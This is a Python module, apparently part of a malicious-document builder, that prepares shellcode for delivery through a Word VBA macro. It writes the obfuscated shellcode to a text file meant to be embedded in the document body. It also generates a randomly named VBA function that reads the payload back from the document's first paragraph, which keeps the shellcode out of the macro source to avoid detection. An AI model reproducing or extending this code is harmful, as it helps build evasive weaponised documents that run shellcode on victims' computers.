import random
import string
from vba.utils.formatters import *

class embedtext:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            self.outfile = arguments['outfile']
        else:
            self.outfile = 'output.txt'
        shellcodeType = type(shellcode).__name__
        if shellcodeType == "str":
            self.type = 'String'
            print(f'Saving obfuscated shellcode to {self.outfile}')
            open(self.outfile, 'w').write(shellcode)
        else:
            print('embedtext only works with strings')
            exit(0)
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_vba'](shellcode, 'obfuscated')

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return [f'embedtext={self.outfile}']

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        return f"""
Function {self.name}() As {self.type}
    obfuscated = ActiveDocument.Paragraphs(1).Range.Text
    obfuscated = Replace(obfuscated, vbCr, " ")
    {self.name} = RTrim(obfuscated)
End Function
"""
